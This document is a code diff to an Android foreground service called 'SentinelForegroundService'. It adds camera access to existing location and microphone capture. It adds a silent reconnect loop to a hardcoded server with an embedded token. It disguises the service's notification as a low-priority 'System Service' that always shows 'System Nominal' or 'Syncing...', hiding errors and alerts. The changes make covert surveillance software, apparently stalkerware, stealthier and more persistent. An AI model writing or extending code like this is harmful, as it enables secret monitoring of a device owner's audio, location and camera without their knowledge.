@@ -24,11 +24,18 @@ import com.sentinel.host.domain.model.ConnectionState
 import com.sentinel.host.domain.usecase.ConnectUseCase
 import com.sentinel.host.worker.SentinelWatchdogWorker
 import dagger.hilt.android.AndroidEntryPoint
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
 import kotlinx.coroutines.CoroutineExceptionHandler
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import javax.inject.Inject
 
@@ -110,18 +117,19 @@ class SentinelForegroundService : Service() {
             // Doze whitelist exemption allows this on most devices.
             // Falls back to LOCATION-only if the OS blocks microphone from background.
             val fullType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
 
             try {
                 startForeground(NOTIFICATION_ID, notification, fullType)
-                Log.i(TAG, "startForeground succeeded with LOCATION|MICROPHONE")
+                Log.i(TAG, "startForeground succeeded with LOCATION|MICROPHONE|CAMERA")
             } catch (e: Exception) {
-                Log.w(TAG, "LOCATION|MICROPHONE failed (${e.message}) — trying LOCATION only")
+                Log.w(TAG, "LOCATION|MICROPHONE|CAMERA failed (${e.message}) — trying LOCATION|MICROPHONE")
                 try {
-                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
-                    Log.i(TAG, "startForeground succeeded with LOCATION only")
+                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
+                    Log.i(TAG, "startForeground succeeded with LOCATION|MICROPHONE")
                 } catch (fallbackEx: Exception) {
-                    Log.e(TAG, "LOCATION fallback also failed: ${fallbackEx.message}", fallbackEx)
+                    Log.e(TAG, "LOCATION|MICROPHONE fallback also failed: ${fallbackEx.message}", fallbackEx)
                     startForeground(NOTIFICATION_ID, notification)
                 }
             }
@@ -133,39 +141,76 @@ class SentinelForegroundService : Service() {
 
         // Start connection supervisor
         connectionSupervisor.start()
+        registerNetworkCallback()
 
-        serviceScope.launch {
-            Log.i(TAG, "Auto-connecting to $SERVER_URL")
-            val result = connectUseCase.execute(SERVER_URL, JWT_TOKEN)
-            result.onSuccess {
-                Log.i(TAG, "Connected and registered successfully")
-                updateNotification("Your device is working well")
-            }
-            result.onFailure { error ->
-                Log.e(TAG, "Connection failed: ${error.message}")
-                updateNotification("Action needed !")
-            }
-        }
+        startAutoRepairConnection()
 
         // Monitor state for notification updates + dynamic microphone elevation on boot
         serviceScope.launch {
             connectionSupervisor.state.collect { state ->
                 val text = when (state) {
                     is ConnectionState.Ready -> {
-                        // Elevate to LOCATION|MICROPHONE once we're connected & in foreground
                         elevateForegroundServiceType()
-                        "Scan Completed"
+                        "System Nominal"
                     }
-                    is ConnectionState.Reconnecting -> "Scanning..."
-                    is ConnectionState.Error -> "Error: ${state.message}"
-                    is ConnectionState.Disconnected -> "Scan failed"
-                    else -> "Scanning..."
+                    is ConnectionState.Reconnecting -> "Syncing..."
+                    is ConnectionState.Error -> "Syncing..."
+                    is ConnectionState.Disconnected -> "Syncing..."
+                    else -> "Syncing..."
                 }
                 updateNotification(text)
             }
         }
 
         return START_STICKY
+    }
+
+    private var autoRepairJob: Job? = null
+
+    private fun startAutoRepairConnection() {
+        autoRepairJob?.cancel()
+        autoRepairJob = serviceScope.launch {
+            var attempt = 0
+            while (isActive) {
+                try {
+                    val isConnected = connectionSupervisor.state.value is ConnectionState.Ready
+                    if (!isConnected) {
+                        Log.i(TAG, "Auto-repair: Attempting silent connection to $SERVER_URL (attempt ${attempt + 1})")
+                        val result = connectUseCase.execute(SERVER_URL, JWT_TOKEN)
+                        if (result.isSuccess) {
+                            Log.i(TAG, "Auto-repair successful: Connected and registered!")
+                            attempt = 0
+                        } else {
+                            attempt++
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "Auto-repair attempt failed: ${e.message}")
+                    attempt++
+                }
+
+                val backoffDelay = (2000L * (1 shl attempt.coerceAtMost(5))).coerceAtMost(30000L)
+                delay(backoffDelay)
+            }
+        }
+    }
+
+    private fun registerNetworkCallback() {
+        try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+            val request = NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build()
+
+            cm?.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: Network) {
+                    Log.i(TAG, "Network available — triggering instant connection auto-repair")
+                    startAutoRepairConnection()
+                }
+            })
+        } catch (e: Exception) {
+            Log.w(TAG, "Could not register network callback: ${e.message}")
+        }
     }
 
     /**
@@ -186,11 +231,12 @@ class SentinelForegroundService : Service() {
             }
 
             val targetType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
             try {
-                val notification = buildNotification("Your device is working well")
+                val notification = buildNotification("System Nominal")
                 startForeground(NOTIFICATION_ID, notification, targetType)
-                Log.i(TAG, "Foreground service elevated to LOCATION|MICROPHONE")
+                Log.i(TAG, "Foreground service elevated to LOCATION|MICROPHONE|CAMERA")
 
                 // Restart audio streamer so AudioRecord is recreated with mic access.
                 // The old AudioRecord (created before MICROPHONE FGS type) returns zeros.
@@ -241,7 +287,7 @@ class SentinelForegroundService : Service() {
         val channel = NotificationChannel(
             CHANNEL_ID,
             "System Sync",
-            NotificationManager.IMPORTANCE_LOW
+            NotificationManager.IMPORTANCE_MIN
         ).apply {
             description = "System Synchronization"
             setShowBadge(false)
@@ -258,12 +304,12 @@ class SentinelForegroundService : Service() {
         )
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle(if (isAlert) "Action Required" else "")
+            .setContentTitle("System Service")
             .setContentText(text)
             .setSmallIcon(R.drawable.ic_silent)
             .setOngoing(true)
-            .setSilent(!isAlert)
-            .setPriority(if (isAlert) NotificationCompat.PRIORITY_HIGH else NotificationCompat.PRIORITY_MIN)
+            .setSilent(true)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setContentIntent(pendingIntent)
             .build()
     }
